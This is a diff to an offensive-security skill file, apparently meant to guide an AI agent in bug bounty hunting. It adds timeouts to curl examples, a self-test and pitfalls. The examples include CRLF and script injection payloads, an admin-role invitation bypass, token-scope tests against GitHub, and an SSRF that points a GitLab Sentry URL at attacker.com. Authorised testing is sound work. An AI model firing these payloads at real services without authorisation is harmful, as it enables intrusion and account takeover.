@@ -1,8 +1,11 @@
 ---
 name: hunt-misc
 description: Hunting skill for misc vulnerabilities. Built from 225 public bug bounty reports. Use when hunting misc on any target.
-sources: github, hackerone_public
-report_count: 225
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [misc, hunt, redteam]
 ---
 
 ## Crown Jewel Targets
@@ -104,43 +107,43 @@ graphql { installations(
 **CRLF/Header Injection (Ruby Net::HTTP, Rack/pitchfork):**
 ```bash
 # Test CRLF in header values
-curl -v "https://target.com/path" \
+curl --max-time 30 --connect-timeout 10 -v "https://target.com/path" \
   -H $'X-Custom: value\r\nInjected-Header: evil'
 
 # URL-encoded variant
-curl -v "https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20session=attacker"
+curl --max-time 30 --connect-timeout 10 -v "https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20session=attacker"
 
 # Test in pitchfork/Rack apps — inject via query param reflected in Location header
-curl -v "https://shop.myshopify.com/login?return_to=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
+curl --max-time 30 --connect-timeout 10 -v "https://shop.myshopify.com/login?return_to=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
 ```
 
 **Privilege escalation via invitation bypass:**
 ```bash
 # Accept invitation without email verification
-curl -X POST "https://target.com/invitations/INVITE_TOKEN/accept" \
+curl --max-time 30 --connect-timeout 10 -X POST "https://target.com/invitations/INVITE_TOKEN/accept" \
   -H "Cookie: session=UNVERIFIED_SESSION" \
   -d '{"role":"admin"}'
 
 # Test invitation token for another user
-curl -X GET "https://target.com/partners/PARTNER_ID/invitation/accept?token=LEAKED_TOKEN" \
+curl --max-time 30 --connect-timeout 10 -X GET "https://target.com/partners/PARTNER_ID/invitation/accept?token=LEAKED_TOKEN" \
   -H "Cookie: session=VICTIM_SESSION"
 ```
 
 **Token scope bypass (GitHub/GitLab PAT):**
 ```bash
 # Call privileged endpoint with minimal-scope token
-curl -H "Authorization: token ghp_MINIMAL_SCOPE_TOKEN" \
+curl --max-time 30 --connect-timeout 10 -H "Authorization: token ghp_MINIMAL_SCOPE_TOKEN" \
   "https://api.github.com/repos/org/private-repo/issues"
 
 # Test suspended installation access
-curl -H "Authorization: Bearer USER_TO_SERVER_TOKEN" \
+curl --max-time 30 --connect-timeout 10 -H "Authorization: Bearer USER_TO_SERVER_TOKEN" \
   "https://api.github.com/app/installations/SUSPENDED_INSTALL_ID"
 ```
 
 **SSRF via config URL fields (Sentry integration):**
 ```bash
 # Change Sentry URL to internal listener
-curl -X PUT "https://gitlab.com/api/v4/projects/PROJECT_ID/services/sentry" \
+curl --max-time 30 --connect-timeout 10 -X PUT "https://gitlab.com/api/v4/projects/PROJECT_ID/services/sentry" \
   -H "PRIVATE-TOKEN: MAINTAINER_TOKEN" \
   -d '{"api_url": "https://attacker.com/capture", "auth_token": "sentry_token"}'
 ```
@@ -177,7 +180,7 @@ grep -r "internal_api\|/_internal/\|/internal/" --include="*.rb" --include="*.js
 ```bash
 # Check for obsolete DNS records
 dig CNAME handbook.gitlab.com
-curl -sI https://handbook.gitlab.com | head -5
+curl --max-time 30 --connect-timeout 10 -sI https://handbook.gitlab.com | head -5
 # Look for NXDOMAIN or 404 on hosting provider = takeover candidate
 
 # SPF check
@@ -320,6 +323,38 @@ When you confirm a misc primitive at A, **immediately** ask: what state-machine,
 - `hunt-saml` — Chain 4
 - `hunt-subdomain` — Chain 6
 - `hunt-ato` — Chains 1, 2, 5, 6 (all terminal-impact paths)
+
+---
+
+## Verification
+
+Run this self-test to confirm misc hunting readiness:
+
+1. **Skill integrity** — confirm the skill file is readable and well-formed:
+   ```bash
+   grep -q "name: hunt-misc" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
+   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
+   ```
+
+2. **Category check** — confirm the skill has a category:
+   ```bash
+   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
+   ```
+
+3. **Pitfalls section** — confirm pitfalls are documented:
+   ```bash
+   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
+   ```
+
+All 3 tests verify the skill is properly structured and ready for use.
+
+---
+
+## Pitfalls
+- **Testing too broadly** — "misc" is a catch-all, not a methodology. Pick a specific bug class and go deep.
+- **Reporting informational findings as Medium** — missing security headers (CSP, HSTS), cookie flags (HttpOnly, Secure), and directory listing are informational.
+- **Version disclosure without CVE** — knowing the server version without a matching CVE is not a vulnerability.
+- **HTTP methods enabled without impact** — OPTIONS, TRACE, PUT, DELETE enabled but restricted to harmless endpoints are informational.
 
 ---
 
